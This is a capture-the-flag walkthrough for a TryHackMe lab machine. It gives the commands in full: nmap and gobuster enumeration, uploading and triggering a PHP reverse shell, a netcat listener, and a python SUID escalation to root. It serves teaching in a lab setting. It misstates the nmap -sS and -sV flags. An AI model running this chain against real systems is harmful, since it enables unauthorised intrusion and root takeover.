@@ -1,0 +1,43 @@
+First, let’s get information about the target. : many information are included in the title and description of the room already.
+Task I:
+1- Connect to TryHackMe network and deploy the machine. If you don’t know how to do this, complete the OpenVPN room first.
+Task II:
+1- Scan the machine, how many ports are open?: 2
+2- What version of Apache are running?: 2.4.29
+3- What service is running on port 22? : ssh for sure :)
+how we gonna make it ? we can do all of that in a one commend :
+lx1@kali:~$ nmap -sV -A -sS -sC 10.10.191.23
+-sS : for scaning the the services
+-sV : for scaning the open ports
+Task III:
+1- Find a form to upload and get a reverse shell, and find the flag.
+user.txt:
+- we will use gobuster for sercheing on dirs like that:
+lx1@kali:~$ gobuster dir -u http://10.10.235.188/ -w wordlist.txt
+-u stand for our targt url
+-w stand for the path of the world list that u want to use.
+so we find a to importint dirs uploads and panel
+Looks like we can use this to upload a web shell and get a reverse shell. Download the php reverse shell script and Make sure to change the values in the script with your own IP address and a port of your choice to get a reverse shell
+- start a netcat listener from your attack machine T :
+lx1@kali:~$ nc -nlvp 80
+- Run the php reverse-shell script by using curl :
+lx1@kali:~$ curl http://10.10.177.208/uploads/reverse-shell.php5
+- so now we are in the machine we can use find to serche on the user file flag by type:
+$ find / -type f -name user.txt 2> /dev/null
+from the result of our find command, we can see the path of the flag : /var/www/user.txt
+now we will read its content using cat command:
+$ cat /var/www/user.txt
+THM{lx1}
+Task 4:
+1- Search for files with SUID permission, which file is weird?
+we will search for files with SUID permission to escalate our privilege using find :
+$ find / -user root -perm /4000 2> /dev/nul
+hmmm, /usr/bin/python looks interesting, its the we are looking for, basicaly if the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.!!
+2- Find a form to escalate your privileges.
+inside gtfobins website, we can serche for ways to abuse python SUID permissions, but 1st lets upgrade our shell using python:
+$ python -c ‘import pty;pty.spawn(“/bin/bash”)’
+Then we will use this commend to abuse suid bits :
+$ python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
+Now we cat read the root flag :
+# cat /root/root.txt
+# THM{lx1}
